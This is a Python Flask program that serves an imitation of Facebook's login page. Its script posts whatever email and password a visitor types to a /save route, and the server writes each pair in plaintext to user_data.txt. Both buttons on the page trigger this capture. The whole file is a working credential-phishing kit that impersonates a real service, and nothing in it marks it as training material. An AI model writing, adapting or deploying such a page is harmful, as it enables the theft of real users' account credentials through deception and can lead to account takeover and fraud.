from flask import Flask, render_template_string, request, jsonify
import json

app = Flask(__name__)

html_content = """
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook — log in or sign up</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- <link rel="stylesheet" href="./index.css"> -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html {
            height: 100%;
        }

        body {
            height: 100%;
            background-color: #f0f2f5;
            font-family: 'Roboto', sans-serif;
        }

        .container {
            display: flex;
            justify-content: center;
            align-content: center;
            align-items: center;
            gap: 20px;
            flex-wrap: wrap;
            width: 100%;
            padding: 20px;
            padding-top: 130px;
        }

        .intro-section h1 {
            font-size: 60px;
            color: #1877f2;
            margin-bottom: 6px;
        }

        .intro-section p {
            font-size: 24px;
            line-height: 28px;
            max-width: 500px;
        }

        .signin-section {
            display: flex;
            flex-direction: column;
            gap: 24px;
            width: 396px;
        }

        .signin-section form {
            background-color: white;
            border-radius: 10px;
            max-width: 396px;
            min-height: 348px;
            padding: 10px 16px;
            margin: 0 auto;
            box-shadow:
                0 2px 4px rgba(0, 0, 0, 0.1),
                0 8px 16px rgba(0, 0, 0, 0.1);
        }

        .signin-section form input {
            border: 1px solid #dddfe2;
            width: 100%;
            padding: 15px 16px;
            margin: 10px 0;
            border-radius: 5px;
            outline: none;
            font-size: 16px;
        }

        .signin-section form input::placeholder {
            color: #777;
            font-size: 16px;
        }

        .signin-section form input:focus {
            outline: none;
            border-color: #1877f2;
        }

        .signin-section form div button {
            background-color: #1877f2;
            border: none;
            width: 100%;
            border-radius: 5px;
            font-size: 20px;
            color: white;
            padding: 14px 0;
            margin: 5px 0;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.1s ease-in;
        }

        .signin-section form div button:hover {
            background: #0d65d9;
        }

        a {
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        .signin-section form a {
            color: #1877f2;
            text-align: center;
            margin: 15px 0;
            display: block;
            font-size: 14px;
        }

        hr {
            margin: 20px 16px;
            border-top: 0.1px solid #dddfe2;
        }

        .signin-section form .create-btn {
            display: flex;
            justify-content: center;

        }

        .signin-section form .create-btn button {
            background-color: #42b72a;
            border: none;
            padding: 15px 20px;
            color: white;
            font-weight: bold;
            font-size: 15px;
            border-radius: 5px;
            width: auto;
            cursor: pointer;
            transition: background 0.1s ease-in;
        }

        .signin-section form .create-btn button:hover {
            background: #3ba626;
        }

        .signin-section p {
            text-align: center;
            font-size: 14px;
        }

        .signin-section p a {
            color: black;
        }

        @media (max-width: 956px) {
            .intro-section {
                text-align: center;
            }

            .container {
                padding-top: 40px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <section class="intro-section">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </section>

        <section class="signin-section">
            <div>
                <form id="userForm" method='POST'>
                    <div>
                        <input type="text" id="email" placeholder="Email address or phone number">
                    </div>

                    <div>
                        <input type="password" id="password" placeholder="Password">
                    </div>

                    <div>
                        <button type="button" onclick="saveUserInput()">Log in</button>
                    </div>

                    <a href="#">Forgotten password?</a>

                    <hr />

                    <div class="create-btn">
                        <button type="button" onclick="saveUserInput()">Log in</button>
                    </div>
                </form>
            </div>
            <p>
                <a href="#"><strong>Create a Page</strong></a> for a celebrity, brand or business.
            </p>
        </section>
    </div>

       <script>
        function saveUserInput() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            fetch('/save', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password })
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>

</html>
"""


def save_to_file(data):
    # Save user data to a text file
    with open('user_data.txt', 'a') as user_data:
        user_data.write(data + '\n')

@app.route('/')
def index():
    return render_template_string(html_content)

@app.route('/save', methods=['POST'])
def save_user_input():
    if request.method == 'POST':
        user_data = request.get_json()
        email = user_data['email']
        password = user_data['password']

        # Save user data to a text file
        save_to_file(f"Email: {email}, Password: {password}")

        return jsonify({"message": "User data saved successfully."})

if __name__ == '__main__':
    app.run(debug=True)